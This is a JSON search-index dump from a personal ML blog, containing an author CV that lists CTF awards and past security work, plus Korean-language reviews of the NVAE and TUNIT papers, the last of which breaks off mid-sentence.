{"componentChunkName":"component---src-pages-search-tsx","path":"/search/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"rawMarkdownBody":"\r\n##  Profile\r\n\r\n**Senior** in Computer Engineering from [KUT](https://www.koreatech.ac.kr/eng.do)\r\n\r\nAlternative Military Service Status : **on-going** (`2020/11/27 ~ 2023/09/26`)\r\n\r\nCV : [[PDF] (as of Dec. 2020)](https://github.com/kozistr/kozistr.github.io/blob/master/cv.pdf)\r\n\r\n## Links\r\n\r\n|              |                                  |\r\n|:-------------|:---------------------------------|\r\n| Email        | **kozistr**@gmail.com            |\r\n| Github       | [https://github.com/kozistr](https://github.com/kozistr)       |\r\n| Kaggle       | [https://www.kaggle.com/kozistr](https://www.kaggle.com/kozistr)   |\r\n| Linkedin     | [https://www.linkedin.com/in/kozistr](https://www.linkedin.com/in/kozistr)     |\r\n| SideShare    | [https://www.slideshare.net/KimHyeongChan](https://www.slideshare.net/KimHyeongChan) |\r\n| Another Blog | [http://zer0day.tistory.com](http://zer0day.tistory.com)       |\r\n\r\n## Interests\r\n\r\n* lots of challenges like kaggle :)\r\n\r\n* (light-weighted) Single Image / Video Super Resolution (SISR)\r\n\r\n* End to End Speaker Diarization (E2E SD)\r\n\r\nPreviously, I'm also interested in **offensive security**, kind of *Reverse Engineering*, *Linux Kernel Exploitation*, ....\r\n\r\n----------------------------------------------------------------\r\n\r\n## Publications\r\n\r\n**Paper**\r\n\r\n[1] **Kim** et al, [CNN Architecture Predicting Movie Rating](http://ktccs.kips.or.kr/digital-library/23245), 2020. 01.\r\n- Wrote about the CNN Architecture, which utilizes a channel-attention method (SE Module) to TextCNN model, brings performance gain over the task while keeping its latency, generally.\r\n- Handling un-normalized text w/ various convolution kernel size and dropout\r\n\r\n**Conferences/Workshops**\r\n\r\n[1] kozistr_team, [*NAVER NLP Challenge 2018 SRL Task*](https://github.com/naver/nlp-challenge/raw/master/slides/Naver.NLP.Workshop.SRL.kozistr_team.pdf)\r\n- SRL Task, challenging w/o any domain knowledge. Presented about trails & errors during the competition\r\n\r\n**Journals**\r\n\r\n[1] zer0day, [*Windows Anti-Debugging Techniques*](http://zer0day.tistory.com/335?category=505873) (CodeEngn 2016) Sep. 2016. [PDF](/refs/Anti%20Revering%20Techniques%20%5Bzer0day%5D.pdf)\r\n- Wrote about lots of anti-reversing / debugging (A to Z) techniques avail on window executable binary\r\n\r\n**Posts**\r\n\r\n[1] kozistr (as a part of team, `Dragonsong`) []()\r\n- Wrote about classifying audios with deep learning based on the kaggle challenge where we participated\r\n\r\n----------------------------------------------------------------\r\n\r\n## Challenges & Awards\r\n\r\n### Machine Learning\r\n\r\n* **Kaggle Challenges** :: Kaggle Challenges :: **Competition Expert**\r\n> * [Cornell Birdcall Identification](https://www.kaggle.com/c/birdsong-recognition) - **team, top 2% (24 / 1395), Private 0.631** (2020.)\r\n> * [ALASKA2 Image Steganalysis](https://www.kaggle.com/c/alaska2-image-steganalysis) - **solo, top 9% (93 / 1095), Private 0.917** (2020.)\r\n> * [Tweet Sentiment Extraction](https://www.kaggle.com/c/tweet-sentiment-extraction) - **solo, top 4% (84 / 2227), Private 0.71796** (2020.)\r\n> * [Flower Classification with TPUs](https://www.kaggle.com/c/flower-classification-with-tpus) - **solo, top 4% (27 / 848), Private 0.98734** (2020.)\r\n> * [Kaggle Bengali.AI Handwritten Grapheme Classification](https://www.kaggle.com/c/bengaliai-cv19) - **solo, top 4% (67 / 2059), Private 0.9372** (2020.)\r\n> * [Kaggle Kannada MNIST Challenge](https://www.kaggle.com/c/Kannada-MNIST) - **solo, top 3% (28 / 1214), Private 0.99100** (2019.)\r\n\r\n* **NAVER NLP Challenge** :: NAVER NLP Challenge 2018\r\n> * [Final](https://github.com/naver/nlp-challenge) - *Semantic Role Labeling (SRL)* **6th place** :: [Presentation]()\r\n\r\n* **A.I R&D Challenge** :: A.I R&D Challenge 2018\r\n> * [Final](http://airndchallenge.com/g5) - *Fake or Real Detection* - as *Digital Forensic* Team\r\n\r\n* **NAVER A.I Hackathon** :: NAVER A.I Hackathon 2018\r\n> * [Final](https://github.com/naver/ai-hackathon-2018) - *Kin* **4th place**, *Movie Review* **13th place** :: [*summary_paper*](https://github.com/kozistr/naver-ai-hackathon-2018)\r\n\r\n* **TF-KR Challenge** :: Facebook TF-KR MNIST Challenge\r\n> * [TF-KR MNIST Challenge](https://github.com/kozistr/MNIST-Competition) - **Top 9, 3rd price, ACC 0.9964**\r\n\r\n### Hacking\r\n\r\n* **Boot2Root CTF 2018** :: **2nd place** (Demon + alpha)\r\n\r\n* **Harekaze CTF 2017** :: **3rd place** (SeoulWesterns)\r\n\r\n* **WhiteHat League 1 (2017)** :: **2nd place** (Demon)\r\n> * Awarded by 한국정보기술연구원 Received an award of **$3,000**\r\n\r\n----------------------------------------------------------------\r\n\r\n## Work Experience\r\n\r\n**Company**\r\n\r\n*Machine Learning Researcher*, **Watcha**, **(2020.06.22 ~ Present)**\r\n- Working as a full time.\r\n- Developed a pipeline to recognize all tv & movie actors from the poster and still-cut images.\r\n  - Utilized **SOTA** face detector & recognizer.\r\n  - Optimized pre/post processing routines to consider `inference time`.\r\n- Developed a novel sequential recommendation architecture to recommend what content to watch next.\r\n  - Achieved **SOTA** performance compared to previous SOTA models (`SASRec`, `BERT4Rec`).\r\n- Developed Image Super Resolution model to upscale movie & tv poster, still-cut images.\r\n  - Optimized the codes for fast `inference time` & `memory-efficiency` on *cpu*.\r\n  - In internal evaluation (qualitative evaluation by the designers), it catches details better & handles higher resolution & takes a little time.\r\n\r\n*Machine Learning Engineer*, **Rainist**, **(2019.11.11 ~ 2020.06.19)**\r\n- Worked as a full time.\r\n- Developed the card & bank account transaction category classification models, designed *light-weight purpose* for the low latency. (now on service)\r\n  - In A/B (online) test result, improved **about 25 ~ 30%p** *accuracy, **about 0.6%p** 1+ retention.\r\n- Developed the machine learning model serving RESTful API server (utilizing k8s + open source project)\r\n  - zero failure rate (**0** 40x, 50x errors)\r\n- Developed the classification model for forecasting possibility of loan overdue.\r\n  - baseline deep learning model\r\n\r\n% *accuracy : how many people don't update/change their transactions' category.\r\n\r\n*Machine Learning Engineer*, **VoyagerX**, **(2019.01.07 ~ 2019.10.04)**\r\n- Worked as an intern.\r\n- Developed speaker verification, diarization models & logic for recognizing the arbitrary speakers recorded from the noisy (real-world) environment.\r\n- Developed a hair image semantic segmentation / image in-paint / i2i domain transfer model for swapping hair domain naturally.\r\n\r\n*Penetration Tester*, **ELCID**, **(2016.07 ~ 2016.08)**\r\n- Worked as a part-time job.\r\n- Penetrated some products related to network firewall and anti-virus product.\r\n\r\n<br>\r\n\r\n**Out Sourcing**\r\n\r\n- Developed Korean University Course Information Web Parser (About 40 Universities). **2 times, (2017.7 ~ 2018.3)**\r\n- Developed AWS CloudTrail logger analyzer / formatter. **(2019.09 ~ 2019.10)**\r\n\r\n<br>\r\n\r\n**Lab**\r\n\r\nHPC Lab, KoreaTech, **Undergraduate Researcher**, **(2018.09 ~ 2018.12)**\r\n- Wrote a paper about improved TextCNN model for predicting a movie rate.\r\n\r\n----------------------------------------------------------------\r\n\r\n## Personal Projects\r\n\r\n### Computer Languages\r\n\r\n> **Python** <br/>\r\n> **C/C++** <br/>\r\n> Assembly (x86, x86-64, arm, ...) <br/>\r\n> *experienced with more than 10 languages*\r\n\r\n### Machine Learning\r\n\r\n**Generative Models**\r\n\r\n* **GANs-tensorflow** :: Lots of GAN codes :) :: [Generative Adversary Networks](https://github.com/kozistr/Awesome-GANs)\r\n> * **ACGAN-tensorflow** :: Auxiliary Classifier GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/ACGAN)\r\n> * **StarGAN-tensorflow** :: Unified GAN for multi-domain :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/StarGAN)\r\n> * **LAPGAN-tensorflow** :: Laplacian Pyramid GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/LAPGAN)\r\n> * **BEGAN-tensorflow** :: Boundary Equilibrium in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/BEGAN)\r\n> * **DCGAN-tensorflow** :: Deep Convolutional GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/DCGAN)\r\n> * **SRGAN-tensorflow** :: Super Resolution GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/SRGAN)\r\n> * **WGAN-GP-tensorflow** :: Wasserstein GAN w/ gradient penalty in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/WGAN)\r\n> * ... lots of GANs (over 20) :)\r\n\r\n**Super Resolution**\r\n* **Single Image Super Resolution** :: Single Image Super Resolution (SISR)\r\n> * **rcan-tensorflow** :: RCAN implementation in tensorflow :: [code](https://github.com/kozistr/rcan-tensorflow)\r\n> * **ESRGAN-tensorflow** :: ESRGAN implementation in tensorflow :: [code](https://github.com/kozistr/ESRGAN-tensorflow)\r\n> * **NatSR-pytorch** :: NatSR implementation in pytorch :: [code](https://github.com/kozistr/NatSR-pytorch)\r\n\r\n**I2I Translation**\r\n* **Improved Content Disentanglement** :: tuned version of 'Content Disentanglement' in pytorch :: [code](https://github.com/kozistr/improved-ContentDisentanglement)\r\n\r\n**Style Transfer**\r\n* **Image-Style-Transfer** :: Image Neural Style Transfer\r\n> * **style-transfer-tensorflow** :: Image Style-Transfer in tensorflow :: [code](https://github.com/kozistr/style-transfer)\r\n\r\n**Text Classification/Generation**\r\n\r\n> * **movie-rate-prediction** :: Korean sentences classification in tensorflow :: [code](https://github.com/kozistr/naver-movie-rate-prediction)\r\n> * **KoSpacing-tensorflow** :: Automatic Korean sentences spacing in tensorflow :: [~~code~~](https://github.com/kozistr/KoSpacing-tensorflow)\r\n> * **text-tagging** :: Automatic Korean articles categories classification in tensorflow :: [code](https://github.com/sales-tagging/text-tagging-ml)\r\n\r\n**Speech Synthesis**\r\n\r\n* **Tacotron-tensorflow** :: Text To Sound (TTS)\r\n> * **tacotron-tensorflow** :: lots of TTS models in tensorflow :: [~~code~~](https://github.com/kozistr/tacotron-tensorflow)\r\n\r\n**Speech Recognition** :: Speech Recognition\r\n> * [private] :: noisy acoustic speech recognition system in tensorflow :: [~~code~~]()\r\n\r\n**Optimizer**\r\n\r\n* **AdaBound** :: Optimizer that trains as fast as Adam and as good as SGD\r\n> * **AdaBound-tensorflow** :: AdaBound Optimizer implementation in tensorflow :: [code](https://github.com/kozistr/AdaBound-tensorflow)\r\n\r\n* **RAdam** :: On The Variance Of The Adaptive Learning Rate And Beyond in tensorflow\r\n> * **RAdam-tensorflow** :: RAdam Optimizer implementation in tensorflow :: [code](https://github.com/kozistr/RAdam-tensorflow)\r\n\r\n**R.L**\r\n\r\n* **Rosseta Stone** :: Hearthstone simulator using C++ with some reinforcement learning :: [code](https://github.com/utilForever/RosettaStone)\r\n\r\n### Plug-Ins\r\n\r\nIDA pro plug-in - Golang ELF binary (x86, x86-64), RTTI parser\r\n- Recover stripped symbols & information and patch byte-codes for being able to hex-ray\r\n\r\n### Open Source Contributions\r\n\r\n* [syzkaller](https://github.com/google/syzkaller) :: New Generation of Linux Kernel Fuzzer :: Minor contribution [#575](https://github.com/google/syzkaller/pull/575)\r\n* [simpletransformers](https://github.com/https://github.com/ThilinaRajapakse/simpletransformers) :: Transformers made simple w/ training, evaluating, and prediction possible w/ one line each. :: Minor contribution [#290](https://github.com/ThilinaRajapakse/simpletransformers/pull/290)\r\n\r\n### Security, Hacking\r\n\r\n**CTFs, Conferences**\r\n\r\n* [POC](http://powerofcommunity.net/) 2016 Conference Staff\r\n* [HackingCamp](http://hackingcamp.org/) 15 CTF Staff, Challenge Maker\r\n* [CodeGate](https://www.codegate.org/) 2017 OpenCTF Staff, Challenge Maker\r\n* [HackingCamp](http://hackingcamp.org/) 16 CTF Staff, Challenge Maker\r\n* [POX](http://www.powerofxx.com/) 2017 CTF Staff, Challenge Maker\r\n* [KID](http://www.powerofxx.com/) 2017 CTF Staff, Challenge Maker\r\n* Belluminar 2017 CTF Staff\r\n* [HackingCamp](http://hackingcamp.org/) 17 CTF Staff, Challenge Maker\r\n* [HackingCamp](http://hackingcamp.org/) 18 CTF Staff, Challenge Maker\r\n\r\n**Teams**\r\n\r\nHacking Team, [**Fl4y**](http://f1ay.com/). **Since 2017.07 ~**\r\n\r\nHacking Team, [**Demon**](https://demonteam.org/) by [*POC*](http://powerofcommunity.net/). **Since 2014.02 ~ 2018.08**\r\n\r\n----------------------------------------------------------------\r\n\r\n### Presentations\r\n\r\n**2018**\r\n\r\n[2] Artificial Intelligence ZeroToAll, Apr 2018.\r\n\r\n[1] Machine Learning ZeroToAll, Mar 2018.\r\n\r\n**2015**\r\n\r\n[1] Polymorphic Virus VS AV Detection, Oct 2015.\r\n\r\n**2014**\r\n\r\n[1] Network Sniffing & Detection, Oct, 2014.\r\n","excerpt":"Profile Senior in Computer Engineering from KUT Alternative Military Service Status : on-going () CV : [PDF] (as of Dec. 2020) Links   Emai…","fields":{"slug":"/about/"},"frontmatter":{"date":"Dec 12, 2020","title":"About ME","tags":["About"],"update":"Dec 13, 2020"}}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근에 NVLabs 에서 VAE 관련 논문이 하나 나왔는데, 매주 월요일이 회사 짬데이라고 개인 or 팀 끼리 공부하고 싶은 주제 공부하고 공유하는 문화가 있어서, 마침 잘 돼서 논문 리뷰를 해 봅니다.\n\npaper : [arXiv](https://arxiv.org/pdf/2007.03898.pdf)\n\ncode : [github](https://github.com/NVlabs/NVAE)\n\n## Related Work\n\nVAE 관련 연구들이 엄청 많아서, 요 논문과 직접 연관이 있는 것들만 적어보면\n\n1. IAF-VAEs (VAE w/ Invertible Autoregressive Flows) : [paper](https://arxiv.org/pdf/1606.04934.pdf)\n2. VQ-VAE-2 (Vector Quantized Variational AutoEncoder v2) : [paper](https://arxiv.org/pdf/1906.00446.pdf)\n3. BIVA (Bidirectional-Inference Variational AutoEncoder) : [paper](https://arxiv.org/pdf/1902.02102.pdf)\n\n## Difference\n\n논문에서 previous works 와 this work 의 차이를 *related work* 에 적힌 3 개의 연구와 비교를 합니다.\n\n요약하면 아래와 같습니다.\n\n### VQ-VAE-2 vs NVAE\n\n비슷한 점은 둘 다 high quality image 생성이 가능하다는 점\n\n| diff \\ work | VQ-VAE-2 | NVAE |\n| :---: | :---: | :---: |\n| objective | ~~VAE objective~~ | VAE objective |\n| latent variable | up to 128x128 (big) | small |\n\n### IAF-VAEs vs NVAE\n\nstatistical models (hierarchical prior, approximate posterior) 컨셉을 IAF-VAEs 에서 가져온 것은 맞는데,\n\n| diff \\ work | IAF-VAEs | NVAE |\n| :---: | :---: | :---: |\n| statistical models | ~~neural network~~ | neural network |\n| posterior | x | parameterized |\n| large-scale | x | o |\n\n### BN (Batch Normalization) in VAE?\n\n이전 연구들에선 BN 이 instability 를 cause 해서 사용을 지양했는데,\n이번 엔구에선 BN parameter 를 적절하게 사용하면 오히려 좋은 성능이 나온다 라고 하더군요.\n\n## Novelty\n\n위와 같은 차이점들에 대해서 이번 연구는 요약해서 크게 3 가지 novelties 를 가집니다.\n\n### Network Design\n\n이전 Hierarchical VAE 연구들은 hierarchical 한 요소들을 objective term 이나 level 에서 고려헀지만,\n\n이번 연구에서는 statistical models 을 **network design 자체에 녹여냈다**.\n\n### Stability\n\nhierarchical groups 수가 증가, input image size (high resolution) 가 커 지면서 stabilization 이 issue 가 되는데,\n이를 직접 디자인한 **(1) network modules**, **(2) approximate posterior 를 parameterize** 함으로 문제 해결.\n\n### Efficiency\n\n효율적은 operation 사용 (e.g. depth-wise separable convolution at decoder) 으로 memory 를 아끼고 성능도 잡아냈다.\n\n% 저자 왈 depth-wise separable conv 를 decoder 에 사용했을 땐 성능이 좋았는데, encoder 에 사용했을 땐 성능이 오히려 안좋았다고 캅니다.\n\n## Introduce\n\n간단하게 deep hierarchical VAE 를 review 하고 넘어가면,\n\n*approximate posterior* 와 *prior* 를 증가시키기 위해, *latent variables* 를 총 *$L$* 개의 disjoint groups 으로 나눕니다.\n\n> $z = {z_1, z_2, ..., z_L}$\n\n그리고 *prior* 와 *approximate posterior* 는 이렇게 써 볼 수 있을텐데, (물론 두 distributions 은 Normal 을 따른다 가정한다)\n\n> $p(z) = \\prod_{l} p(z_l\\|z_{<l})$\n\n> $q(z\\|x) = \\prod_{l} q(z_l\\|z_{<l}, x)$\n\n그럼 $log p(x)$ 에 대한 lower bound $L_{VAE} (x)$ 는 아래와 같이 쓸 수 있겠죠...?\n\n> $L_{VAE} (x) = \\mathop{\\mathbb{E}}_{q(z\\|x)} - KL(q(z_{1}\\|x) \\|\\| p (z_{1})) - \\sum_{l=2}^{L} \\mathbb{E}_{q (z_{l}\\|x)} KL (q (z_{l}\\|x, z_{<l}) \\|\\| p(z_{l}\\|z_{<l}))$\n\n한번 더 적어보면, 아래가 이제 $(l - 1)^{th}$ group 까지의 *approximate posterior* 가 되는 겁니다.\n\n> $q(z_{<l}\\|x) = \\prod_{i=1}^{l-1} q(z_{i}\\|x, z_{<i})$\n\n그럼 여기서 $p(x, z)$, $p(z\\|x)$ 를 어떻게 neural network 로 구현할 지가 이번 연구에서 포인트 입니다.\n\n## Architecture\n\n아래 이미지와 같이 Bidirectional Encoder ($p(z\\|x)$) 와 Generative Model ($p(x, z)$)이 있는데,\n\nlevel 에 맞게 각 group 에서 sample 해 와서 add 하는 연산을 합니다.\n\n또한 computation cost 를 줄이기 위해 Bidirectional Encoder 에 있는 top-down model 부분은 Generative Model 하고 weight-share 하네요.\n\n![img](architecture.png)\n\n### Residual Cells for VAE\n\n일반적으로 long-range correlations 를 잘 잡아내기 위한 방법으론 *hierarchical multi-scale model* 을 사용하는 건데,\n그냥 이걸 썼다는 정도 입니다.\n\n### Residual Cells for Generative Model\n\nnetwork 의 receptive field 크기를 늘릴 수록 long-range correlations 을 잡는데 유리하다고 설명하는데,\n일반적으로는 encoder / decoder 에 사용된 residual network 안에 convolution kernel size 를 늘리면 되겠지만,\n그냥 늘리면 computation 이 엄청 늘어나니까, 이걸 depth-wise separable convolution 을 사용해 해결합니다.\n\n![img](residual_blocks.png)\n\nMobileNet-V2 에서 언급되었던 것 처럼, depth-wise convolution 하나만 으로 대채만 하는 건,\n각 channel 따로따로 동작하는 연산특 때문에 표현성(?)에서 제한이 있어서, 위 그림처럼 conv 1x1 으로 채널을 뻥튀기 해 준 후에 depthwise conv 5x5 를 적용합니다.\n\n#### BatchNormalization\n\n위에서 언급했듯, BN 은 training instability 때문에 BN 대신 WN (Weight Normalization) 을 사용했는데,\n\n이 논문에서, 실제 BN 의 문제는 evaluation 시, slow-moving running statistics 값 때문에 shifted 돼서, output 이 dramatic 하게 바뀔수 있다는 점이라 말하면서,\n이 문제를 해결하기 위해 BN momentum 값을 batch statistics 을 빠르게 잘 잡도록 변경을 해 줬다고 합니다.\n\n또한, scaling parameter 에 norm regularization 도 해 줬다고 합니다.\n\n### Residual Cells for Bidirectional Encoder\n\nencoder 에서는 depth-wise convolution 이 효과가 없어서 그냥 regular convolution 사용했다고 합니다.\n\n### Taming the Unbounded KL Term\n\ndeep hierarchical VAE 를 훈련하는데 있어, unbounded KL 를 optimize 하기엔 어렵다는 말을 쭉 합니다.\n\n그래서 KL 를 잘 optimize 하고 stable 하게 훈련할 수있는 방법들을 제안합니다.\n\n#### Residual Normal Distributions\n\n> $p(z_{l}^{i}\\|z_{<l}) = \\mathcal{N} (\\mu_{i} (z_{<l}), \\sigma_{i} (z_{<l}))$ 가 $i^{th}$ variable in $z_{l}$ prior 가 normal  이라 하면,\n\n아래와 같이 정의해 볼 수 있습니다.\n\n> $q(z_{l}^{i}\\|z_{<l}, x) = \\mathcal{N} (\\mu_{i} (z_{<l}) + \\Delta \\mu_{i} (z_{<l}, x), \\sigma_{i} (z_{<l}) + \\Delta \\sigma_{i} (z_{<l}, x))$\n\n여기서 *delta* 들은 *prior* 와*approximate posterior* 의 relative location & scale 입니다.\n\n> $KL (q(z^{i}\\|x)\\|\\|p(z^{i})) = (\\frac{\\Delta \\mu_{I}^{2}}{\\sigma_{i}^{2}} + \\Delta \\sigma_{i}^{2} - log \\sigma_{i}^{2} - 1) / 2$\n\n만약 decoder output 인 $\\sigma_{i}$ 가 bounded below 면, 위 KL term 이 공식에 나온 것 처럼, encoder output 인 relative parameter 에 영향을 많이 받게됩니다.\n\n즉, $q(z_{l}^{i}\\|z_{<l}, x)$ 가 absolute location & scale 일 때, 요 KL term 으로 minimization 하기 쉬워지는걸 의도했네요.\n\n#### Spectral Regularization\n\n위에서 제안한 *Residual Normal Distributions* 만으로 stablize 하기 어렵다고 생각해 (아직 unbounded 기 때문),\nbound KL 을 만들기 위해, input changes 에 output 이 dramatic 하게 변하면 안된다는게 보장돼야 합니다 ~> **smoothness**.\n그래서 이 연구에선 Lipschitz constant 를 regularizing 함으로 bounded 를 ensure 함을 가정합니다.\n\n이어서, Lipschitz constant 를 측정하기는 힘드니, *Spectral Regularization* 을 각 layer 에 적용을 합니다. (lipschitz constant 를 minimize 해 주는 scheme 에서), loss term 에도 해당 regularization term 을 추가해서 minimize 합니다.\n\n> $L_{SR} = \\lambda \\sum_{i} s^{(i)}$, $s(i)$ 는 $i^{th}$ convolution 의 largest singular value\n\n#### More Expressive Approximate Posteriors with Normalizing Flow\n\n지금 구조는 *approximate posterior* 를 각 group 에서 병렬로 샘플하기 좋은 구조로 돼있는데 (상대적으로 작은 parameter 수, 등등), 조금 다르게 말하면, less expressive 하다고 말할 수 있다.\n\n더 expressive 하게 만들기 위해 normalizing flow 몇 개를 추가해서 더 expressive 하게 만들자가 목적이다.\n\nencoder 에만 해당 normalization flow 가 추가되면,\n\n1. IAF (Inverse Autoregressive Flows) 가능 (따른 명시적으로 inverse 해 주는 flow 필요 x)\n2. sampling time 도 flow 덕문에 증가하지 않을 거다.\n\n라는 장점을 듭니다.\n\n## Experiment Result\n\n###  Quantitative Performance Benchmark\n\nbits/dimension (bpd) metric 에서 SOTA 에 해당하는 성능을 보이네요.\n\n![img](performance_benchmark.png)\n\n### Generations\n\n![img](generated_images.png)\n\n## Conclusion\n\n개인적으로 NVIDIA 연구들은 보면 StyleGANv2 도 그렇고 network design 으로 문제를 해결해 나가는 모습을 많이 보이는데, 이번에도 어썸했다.\n\n또, 연구를 진행하고 결과를 내는 것들이 대단하다 생각하지만,\n최근 들어 VAE 쪽 논문들이 큰 novelty 없이 생산되는(?) 경향이 있었는데, 오랜만에 개인적으로 괜찮다 생각되는 AE 논문이 나온거 같아서 기분이가 좋았다.\n\n결론 : 굳굳굳\n","excerpt":"TL;DR 최근에 NVLabs 에서 VAE 관련 논문이 하나 나왔는데, 매주 월요일이 회사 짬데이라고 개인 or 팀 끼리 공부하고 싶은 주제 공부하고 공유하는 문화가 있어서, 마침 잘 돼서 논문 리뷰를 해 봅니다. paper : arXiv code …","fields":{"slug":"/NVAE/"},"frontmatter":{"date":"Sep 07, 2020","title":"NVAE A Deep Hierarchical Variational Autoencoder","tags":["Deep-Learning"],"update":"Sep 07, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n최근에 Clova AI 에서 unsupervised image 2 image translation 관련 논문이 나와서 한번 빠르게 봤습니다.\r\n\r\n일단 제목부터가 재밌는데 TUNIT, **Truly** Unsupervised Image to Image Translation 의 약자입니다. \r\n요즘 unsup, semi-sup 이라 하면서, 사실은 supervised 인 approach 들이 있어서 그런지, 이거는 **찐**이다 라는 걸 제목부터 보여주고 싶었나 보네요.\r\n\r\n~~헛소리였고.~~,  reproducible 가능한 코드도 논문 공개와 같이 돼서 좋네요. \r\n\r\npaper : [arXiv](https://arxiv.org/pdf/2006.06500.pdf)\r\n\r\ncode : [github](https://github.com/clovaai/tunit)\r\n\r\n## Related Work\r\n\r\nImage-to-Image Translation 쪽 papers 이 정도만\r\n\r\n* CyCleGAN : [paper](https://arxiv.org/pdf/1703.10593.pdf)\r\n* UNIT : [paper](https://arxiv.org/pdf/1703.00848.pdf)\r\n* MUNIT : [paper](https://arxiv.org/pdf/1804.04732.pdf)\r\n* FUNIT : [paper](https://arxiv.org/pdf/1905.01723.pdf)\r\n* StyleGAN-v2 : [post](http://kozistr.tech/deep-learning/2020/02/29/StyleGANv2.html)\r\n* StarGAN-v2 : [post](http://kozistr.tech/deep-learning/2020/02/10/StarGANv2.html)\r\n\r\n## Introduce\r\n\r\n이전에도 여러 i2i translation approaches 가 존재했지만, \r\n주로 연구들이 set-level 에서 multimodal translate 할 때, domain label 이 필요하다는 점이 있었고,\r\n이런 문제를 해결하기 위해 pre-trained classifier 를 adopt 해서 domain info 를 extract 하는 방식들의 접근이 있었어요.\r\n또 self-supervised 방식으로 mutual information maximization 를 통해 각 이미지들을 잘 cluster 하려는 시도도 있었습니다.\r\n\r\n하지만 real-world data 들은 label 들을 주로 구하기 힘든 문제들이 존재하니, \r\n그럼 어떻게 unlabelled data 로 (unsupervised) i2i translate 를 잘 할 수 있을지를 해결한 논문입니다.\r\n\r\n## Method\r\n\r\n![img](tunit-architecture.png)\r\n\r\n위 이미지가 전반적인 TUNIT architecture 인데요, 크게 3 종류의 network 로 구성돼있습니다.\r\n\r\n* Network E : Guiding Network\r\n* Network D : Discriminator\r\n* Network G : Generator\r\n\r\n### Guiding Network\r\n\r\n이 논문의 핵심(?)인 network 인 guiding network 인데요, \r\n해당 network 에서는 input image 를 입력받으면, *pseudo label* 과 *style code (embedding)* 을 줍니다.\r\n\r\n*pseudo label* 은 network 가 예측한 해당 domain 의 class 가 되겠고, *style code* 는 해당 image 의 style 을 담고 있는 embedding 일 겁니다.\r\n\r\n#### Unsupervised Domain Classification\r\n\r\n하지만, 여기선 image domain 에 대한 label 을 구할 수가 없는데요, 대략 임의의 class 수 ($K$, e.g) 5, 10, 20)를 잡습니다. (K 잡는 게 NetVLAD 비슷한 느낌 하네요)\r\n\r\n그리고 다른 unsupervised method 에서 주로 사용하는 방식인 augmentation (e.g) random cropping, horizontal flip, ....)을 통해서 각 domain 의 cluster 를 학습하는데, \r\n여기서 mutual information (MI) 를 maximize 하는 방식으로 진행하게 됩니다.\r\n\r\n> $I(p,p^+) = H(p) - H(p\\|p^+)$, $p = E_{class}(x)$\r\n\r\n여기서 image $x$ 라 하면, $x^+$ 는 augmented image $x$ 이고, $p$ 는 K domains 에 대한 확률값이라 볼 수 있겠습니다. (softmax 가 정확히는 확률값은 아니지만)\r\n\r\nentropy $H(p)$ 가 maximize, cond entropy $H(p\\|p^+)$ 가 minimize 되면서, \r\n결과적으로 해당 MI 가 maximize 되면, 모든 samples 들이 K domains 에 골고루 분포되면서,\r\naugmented 된 domain 들에 대해선 같은 domain 으로 묶겠죠?\r\n\r\n위 공식을 entropy loss scheme 으로 다시 써 보면 아래처럼 됩니다.\r\n\r\n> $L_{MI}$ = $I(p,p^+)$ = $I(P)$ = $\\sum_{i=1}^{K} \\sum_{j=1}^{K} P_{ij} \\log \\frac{P_{ij}}{P_{i}P_{j}}$, $P_{ij} = P(p = i, p^+ = j)$\r\n\r\n#### Improving Domain Classification\r\n\r\nimage 가 higher-resolution & complex 하고 diverse 하는 문제를 극복하기 위해 \r\ndomain classification 이외에 auxiliary branch 로 style code 를 뽑아 여기에 contrastive loss 를 붙였습니다.\r\n\r\n> $L_{style}^E = - log \\frac{exp(s \\cdot s^+ / \\Gamma)}{\\sum_{i=0}^N exp(s \\cdot s_{i}^- / \\Gamma)}$\r\n\r\n이런 식인데, contrastive loss 목적처럼 positive pair 는 가깝게, negative pair 는 멀리 보내는 역할을 합니다.\r\n\r\n이 method 적용으로 위 method 하나만 사용했을 때 보다 약 35% 정도 AnimalFaces 에서 classification accuracy 가 증가했다고 하네요.\r\n\r\n### Discriminator & Generator\r\n\r\n두 개 다 특별한 거 없이, discriminator 는 multi-task discriminator (K classes) 고, \r\ngenerator 도 guiding network E 에서 오는 style code 기반으로 이미지를 생성하는 network 입니다. \r\n\r\nadv loss 도 simple 한 vanilla gan loss 를 사용하네요.\r\n\r\n#### Style Contrastive Loss\r\n\r\n> $L_{style}^G = - log \\frac{exp(s^{'} \\cdot s^~ / \\Gamma)}{\\sum_{i=0}^N exp(s^{'} \\cdot s_{i}^- / \\Gamma)}$\r\n\r\n$s^{'} = E_{style}(G(x, s^~))$, $s^{'}$ 는 생성된 이미지에 대한 style 이고 (positive), - 는 negative style.\r\n\r\n위 loss function 을 사용하면 ref image x 에 대해 생성된 이미지가 유사해지니 (positive 는 유사, negative 는 안 유사),\r\nguiding network E 가 모든 이미지를 하나의 style code 로 뽑는 것도 막을 수 있겠죠. (여기서 only recon loss 만 사용할 때 문제)\r\n\r\n#### Reconstruction Loss\r\n\r\n여기도 특별한 건 없고, image x 와 해당 style s 에 대해 생성된 이미지와의 L1 loss 를 minimize 합니다.\r\n\r\n### Total Loss\r\n\r\n> $L_{D} = - L_{adv}$\r\n> $L_{G} = L_{adv} + \\lambda_{style}^G L_{style}^G + \\lambda_{rec} L_{rec}$\r\n> $L_{E} = L_{G} - \\lambda_{MI} L_{MI} + \\lambda_{style}^E L_{style}^E$\r\n\r\n## Experiment Result\r\n\r\n### Translation Loss on AnimalFaces-10\r\n\r\n$L_{style}$, $L_{rec}$ 없을 때 하고 풀버전(?) 하고 거의 유사하긴 하지만, 모두 적용했을 때가 제일 FID 가 좋네요.\r\n\r\n![img](translation-loss.png)\r\n\r\n### t-SNE visualization of the style space\r\n\r\n$K = 10$ 설정일 때, style code 들이 얼마나 cluster 별 domain style 을 뽑고 있나 봤을 때, \r\n잘 분리하고 있는 걸 보여줍니다.\r\n\r\n![img](t-SNE-vis.png)\r\n\r\n## Conclusion\r\n\r\n재밌는 approach 